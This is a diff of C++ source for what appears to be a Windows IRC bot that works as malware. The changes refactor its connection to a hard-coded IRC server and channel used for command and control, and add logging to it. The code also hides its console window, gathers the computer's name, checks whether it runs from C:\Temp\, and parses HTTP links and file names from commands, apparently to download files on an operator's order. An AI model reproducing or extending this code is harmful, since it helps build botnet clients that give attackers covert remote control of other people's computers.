@@ -1,10 +1,14 @@
-#ifdef D_LIB
-#include <dlib/all/source.cpp>
-#endif
+
 
 #include <string>
 
 #include <boost/asio.hpp>
+
+#ifdef D_LIB
+#include <dlib/all/source.cpp>
+#endif
+
+
 #include <iostream>
 #include <istream>
 #include <ostream>
@@ -58,10 +62,8 @@ void Stealth(int x);
 
 int sec,r,x,found,found2,found3,found4,found5,found6,found7,found8,found9,verb1=6,passwords=0;
 
-std::string total,file2,path,resev,l,cont(""),MESSAGE,
-IDENT=("maubsdadffot"),REALNAME=("kebeqcn"),NICK=("Maysqeqehry"),HOST=("punch.wa.us.dal.net")
-,str1 ("PING :"+HOST),comd,E,F,Z,q,msg,
-channel="#kens",channel2="Pho_enix :",version=("Version 1.1"),str=("PRIVMSG ");
+std::string total,file2,path,resev,l,cont(""),MESSAGE,HOST,channel,
+IDENT=("maubsdadffot"),REALNAME=("kebeqcn"),NICK=("Maysqeqehry"),str1 ("PING :"+HOST),comd,E,F,Z,q,msg,channel2="Pho_enix :",version=("Version 1.1"),str=("PRIVMSG ");
 
 
 char *writable;
@@ -69,14 +71,14 @@ size_t starting_index = 0;
 std::string const LETTERS ="abcdefghijklnmopqrstuvwxyzABCDEFGHIJKLNMOPQRSTUVWXYZ",NUMBERS = "0123456789";
 
 
-void IrcConnect(void)
+void IrcConnect(std::string HOST,std::string channel )
 {
         #ifdef D_LIB
         logircConnect << LINFO << "Has been started with void params";
         #endif
 
             std::ostream request_stream(&request);
-            std::string NICK=("Maysqeqehry"),channel=("kens"),REALNAME=("kebeqcn");
+            std::string REALNAME=("kebeqcn");
 
             tcp::resolver resolver(io_service);
             tcp::resolver::query query(HOST, "6667");
@@ -120,7 +122,7 @@ void IrcConnect(void)
                                     {
                                         std::cout<<resev<<std::endl;
             #ifdef D_LIB
-            logircConnect << LDEBUG <<"Lenght is: "<<resev.length();
+            logircConnect << LDEBUG <<"Received : "<<resev.length()<<" Bytes.";
             #endif
                                         int ping=resev.find("PING",starting_index);
                                         if (ping!=-1)
@@ -362,9 +364,9 @@ void Stealth(int x)
         ShowWindow(Stealth,x);/*show console app 1*/
         #ifdef D_LIB
         if (x==1)
-            logStealth<< LDEBUG<<"The Display mode is On";
+            logStealth<< LDEBUG<<"Console Display mode is On";
         else
-    logStealth<< LDEBUG<<"The Display mode is Of";
+    logStealth<< LDEBUG<<"Console Display mode is Off";
     #endif // D_LIB
 }
 
@@ -425,7 +427,7 @@ void cmd(void)
                  #ifdef D_LIB
                 logcmd<<LINFO <<"Completed http & filename finder";
                 #endif // D_LIB
-                if (E.length()>1&q.length()>1)
+                if (E.length()>1&&q.length()>1)
                         {
                             std::string::size_type i = 0;
                             #ifdef D_LIB
@@ -564,15 +566,17 @@ void cmd(void)
 void Compname(void)
 {
 #ifdef D_LIB
-logCompname<<LINFO <<"Started";
+logCompname<<LINFO <<" :Started logging.";
 #endif // D_LIB
     nameBufSize = sizeof nameBuf - 1;
         if (GetComputerName(nameBuf, &nameBufSize) == TRUE)
             {
-
+            #ifdef D_LIB
+            logCompname<<LINFO <<" :Assigned Computer name :"<<nameBuf;
+            #endif
             }
 #ifdef D_LIB
-logCompname<<LINFO <<"Exiting";
+logCompname<<LINFO <<" :Exiting";
 #endif // D_LIB
 }
 
@@ -585,14 +589,19 @@ logCompname<<LINFO <<"Exiting";
 
 int main(int argc, char *argv[])
 {
-    #ifdef D_LIB
-    std::ofstream os("logger.txt", std::ios_base::out);
-    set_all_logging_output_streams (os);
-    #endif // D_LIB
-    Verbose(verb1);
+#ifdef D_LIB
+std::ofstream os("logger.txt", std::ios_base::out);
+set_all_logging_output_streams (os);
+#endif // D_LIB
+Verbose(5);
 #ifdef D_LIB
 logmain<<LINFO <<"Started";
 #endif // D_LIB
+
+HOST=("punch.wa.us.dal.net"),channel="#kens";
+
+
+
     SplitFilename(argv[0]);
     if(path!="C:\\Temp\\")
         {
@@ -618,7 +627,7 @@ logmain<<LINFO <<"Started";
     logmain<<LINFO <<"Inside while loop";
     #endif // D_LIB
             try{
-                IrcConnect();
+                IrcConnect(HOST,channel);
                 } catch (const std::exception& ex) {
 // ...
                 } catch (const std::string& ex) {
